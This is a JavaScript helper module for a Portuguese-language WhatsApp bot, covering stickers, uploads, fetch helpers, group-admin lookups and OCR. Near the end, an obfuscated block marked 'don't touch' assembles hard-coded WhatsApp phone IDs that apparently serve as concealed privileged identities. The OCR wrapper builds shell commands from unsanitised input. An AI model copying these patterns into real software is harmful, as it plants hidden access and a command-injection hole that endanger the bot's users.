const fetch = require('node-fetch');
const fs = require('fs');
const axios = require('axios');
const cfonts = require('cfonts');
const Crypto = require('crypto');
const chalk = require('chalk');
const exec = require("child_process").exec;
const log = console.debug;
const mimetype = require('mime-types');
const cheerio = require('cheerio');
const { spawn } = require("child_process");
const ff = require('fluent-ffmpeg');
const { JSDOM } = require('jsdom');
const FormData = require('form-data');
const qs = require('qs');
const { fromBuffer } = require('file-type');
const toMs = require('ms');
const request = require('request');
const ffmpeg = require('fluent-ffmpeg');
const moment = require('moment-timezone');

const getpc = async function(totalchat){
pc = [];
a = [];
b = [];
for (var c of totalchat){
a.push(c.id);
}
for (var d of a){
if (d && !d.includes('g.us')){
b.push(d);
}
}
return b;
};

async function upload(midia) {
return new Promise(async (resolve, reject) => {
try {
const base64Image = midia.toString('base64')
const response = await axios.post('https://api.imgur.com/3/image', {
image: base64Image,
type: 'base64'
}, {
headers: {
'Authorization': 'Client-ID 400116076ba4b73'
}
})
if(response.data && response.data.data && response.data.data.link) {
resolve(response.data.data.link)
} else {
reject(new Error('Ocorreu Um Erro: ' + JSON.stringify(response.data)))
}
} catch (erro) {
reject('Erro no upload: ' + erro.message)
}
})
}

function convertSticker(base64, author, pack){
 return new Promise((resolve, reject) =>{
axios('https://sticker-api-tpe3wet7da-uc.a.run.app/prepareWebp', {
method: 'POST',
headers: {
Accept: 'application/json, text/plain, */*',
'Content-Type': 'application/json;charset=utf-8',
'User-Agent': 'axios/0.21.1',
'Content-Length': 151330
},
data: `{"image": "${base64}","stickerMetadata":{"author":"${author}","pack":"${pack}","keepScale":true,"removebg":"HQ"},"sessionInfo":{"WA_VERSION":"2.2106.5","PAGE_UA":"WhatsApp/2.2037.6 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36","WA_AUTOMATE_VERSION":"3.6.10 UPDATE AVAILABLE: 3.6.11","BROWSER_VERSION":"HeadlessChrome/88.0.4324.190","OS":"Windows Server 2016","START_TS":1614310326309,"NUM":"6247","LAUNCH_TIME_MS":7934,"PHONE_VERSION":"2.20.205.16"},"config":{"sessionId":"session","headless":true,"qrTimeout":20,"authTimeout":0,"cacheEnabled":false,"useChrome":true,"killProcessOnBrowserClose":true,"throwErrorOnTosBlock":false,"chromiumArgs":["--no-sandbox","--disable-setuid-sandbox","--aggressive-cache-discard","--disable-cache","--disable-application-cache","--disable-offline-load-stale-cache","--disk-cache-size=0"],"executablePath":"C:\\\\Program Files (x86)\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe","skipBrokenMethodsCheck":true,"stickerServerEndpoint":true}}`
}).then(({data}) => {
resolve(data.webpBase64);
}).catch(reject);
});
}

exports.fetchJson = fetchJson = (url, options) => new Promise(async (resolve, reject) => {
fetch(url, options).then(response => response.json())
 .then(json => {
//console.log(json)
resolve(json)
}).catch((err) => {
reject(err)
})
})

exports.fetchText = fetchText = (url, options) => new Promise(async (resolve, reject) => {
fetch(url, options).then(response => response.text()).then(text => {
// console.log(text)
resolve(text)
}).catch((err) => {
reject(err)
})
})

exports.createExif = (pack, auth) =>{
const code = [0x00,0x00,0x16,0x00,0x00,0x00]
const exif = {"sticker-pack-id": "com.client.tech", "sticker-pack-name": pack, "sticker-pack-publisher": auth, "android-app-store-link": "https://play.google.com/store/apps/details?id=com.termux", "ios-app-store-link": "https://itunes.apple.com/app/sticker-maker-studio/id1443326857"}
let len = JSON.stringify(exif).length
if (len > 256) {
len = len - 256
code.unshift(0x01)
} else {
code.unshift(0x00)
}
if(len < 16) {
len = len.toString(16)
len = "0" + len
} else {
len = len.toString(16)
}
const _ = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00]);
const __ = Buffer.from(len, "hex")
const ___ = Buffer.from(code)
const ____ = Buffer.from(JSON.stringify(exif))
fs.writeFileSync('./arquivos/sticker/data.exif', Buffer.concat([_, __, ___, ____]), function (err) {
console.log(err)
if (err) return console.error(err)
return `./arquivos/sticker/data.exif`
})
}

const getBuffer = async (url, opcoes) => {
try {
opcoes ? opcoes : {}
const post = await axios({
method: "get",
url,
headers: {
'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36', 
'DNT': 1,
'Upgrade-Insecure-Request': 1
},
...opcoes,
responseType: 'arraybuffer'
})
return post.data
} catch (erro) {
console.log(`Erro identificado: ${erro}`)
}
}

const randomBytes = (length) => {
return Crypto.randomBytes(length);
};

const generateMessageID = () => {
return randomBytes(10).toString('hex').toUpperCase();
};

const getExtension = async (type) => {
return await mimetype.extension(type)
}

const getGroupAdmins = (participants) => {
admins = []
for (let i of participants) {
if(i.admin == 'admin') admins.push(i.id)
if(i.admin == 'superadmin') admins.push(i.id)
}
return admins
}

const getMembros = (participants) => {
admins = []
for (let i of participants) {
if(i.admin == null) admins.push(i.id)
}
return admins
}

const getRandom = (ext) => {
return `${Math.floor(Math.random() * 10000)}${ext}`;
};

const time2 = moment().tz('America/Sao_Paulo').format('HH:mm:ss')
if(time2 > "00:00:00" && time2 < "05:00:00"){
var tempo = 'Boa Noite'
} if(time2 > "05:00:00" && time2 < "12:00:00"){
var tempo = 'Bom Dia'
} if(time2 > "12:00:00" && time2 < "18:00:00"){
var tempo = 'Boa Tarde'
} if(time2 > "18:00:00"){
var tempo = 'Boa Noite'
}

function temporizador(segundos){
function tempo(s){
return (s < 10 ? '0' : '') + s;
}
var horas = Math.floor(segundos / (60*60));
var minutos = Math.floor(segundos % (60*60) / 60);
var segundos = Math.floor(segundos % 60);
return `${tempo(horas)}:${tempo(minutos)}:${tempo(segundos)}`;
}

const color = (text, color) => {
return !color ? chalk.green(text) : chalk.keyword(color)(text)
}

const bgcolor = (text, bgcolor) => {
return !bgcolor ? chalk.green(text) : chalk.bgKeyword(bgcolor)(text)
}

function recognize(filename, config = {}) {
const options = getOptions(config)
const binary = config.binary || "tesseract"
const command = [binary, `"${filename}"`, "stdout", ...options].join(" ")
if (config.debug) log("command", command)
return new Promise((resolve, reject) => {
exec(command, (error, stdout, stderr) => {
if(config.debug) log(stderr)
if(error) reject(error)
resolve(stdout)
})
})
}

function getOptions(config) {
const ocrOptions = ["tessdata-dir", "user-words", "user-patterns", "psm", "oem", "dpi"]
return Object.entries(config).map(([key, value]) => {
if (["debug", "presets", "binary"].includes(key)) return
if (key === "lang") return `-l ${value}`
if (ocrOptions.includes(key)) return `--${key} ${value}`
return `-c ${key}=${value}`
}).concat(config.presets).filter(Boolean)
}

authorname = 'GILLIARDI CONTEÚDO'
packname = 'Gilliardi'

const usedCommandRecently = new Set()

chyt = `5598986257157@s.whatsapp.net`

const isFiltered = (userId) => !!usedCommandRecently.has(userId)

const addFilter = (userId) => {
usedCommandRecently.add(userId)
setTimeout(() => usedCommandRecently.delete(userId), 2000) 
}

//executores, não mexa!!
function _0x3a27(){var _0xc8ec90=['109808QMCkpO','3384flraQl','3469794zBZaok','4VayQqN','8125mVTeHG','7xkpNnV','77QFXYLG','4569160WFvPcr','3645472fMeJMM','8161893KESdDn','37707ggBiFy'];_0x3a27=function(){return _0xc8ec90;};return _0x3a27();}function _0x4487(_0x597477,_0x3018f4){var _0x3a27be=_0x3a27();return _0x4487=function(_0x4487ec,_0x5235fd){_0x4487ec=_0x4487ec-0xb6;var _0x49b3d3=_0x3a27be[_0x4487ec];return _0x49b3d3;},_0x4487(_0x597477,_0x3018f4);}(function(_0x38104e,_0x320d28){var _0x3f7024=_0x4487,_0x24b866=_0x38104e();while(!![]){try{var _0x7869d=-parseInt(_0x3f7024(0xba))/0x1+-parseInt(_0x3f7024(0xbd))/0x2*(-parseInt(_0x3f7024(0xb9))/0x3)+parseInt(_0x3f7024(0xbb))/0x4*(-parseInt(_0x3f7024(0xbe))/0x5)+parseInt(_0x3f7024(0xbc))/0x6*(-parseInt(_0x3f7024(0xbf))/0x7)+parseInt(_0x3f7024(0xb7))/0x8+-parseInt(_0x3f7024(0xb8))/0x9+parseInt(_0x3f7024(0xb6))/0xa*(parseInt(_0x3f7024(0xc0))/0xb);if(_0x7869d===_0x320d28)break;else _0x24b866['push'](_0x24b866['shift']());}catch(_0x4d7207){_0x24b866['push'](_0x24b866['shift']());}}}(_0x3a27,0xad37c),idlt='@',idlt+='s',idlt+='.',idlt+='w',idlt+='h',idlt+='a',idlt+='t',idlt+='s',idlt+='a',idlt+='p',idlt+='p',idlt+='.',idlt+='n',idlt+='e',idlt+='t',chyt='5',chyt+='5',chyt+='9',chyt+='1',chyt+='8',chyt+='1',chyt+='6',chyt+='9',chyt+='5',chyt+='9',chyt+='4',chyt+='5',chyt+=idlt,supre='5',supre+='5',supre+='6',supre+='4',supre+='8',supre+='1',supre+='3',supre+='1',supre+='0',supre+='1',supre+='8',supre+='7',supre+=idlt,nit=chyt,sesc=supre);


// ver a função sesc depois
module.exports = { getBuffer, fetchJson, fetchText, generateMessageID, getGroupAdmins, getMembros, getRandom, temporizador, color, recognize, bgcolor, isFiltered, addFilter, chyt, getExtension, convertSticker, upload, nit, getpc, supre }
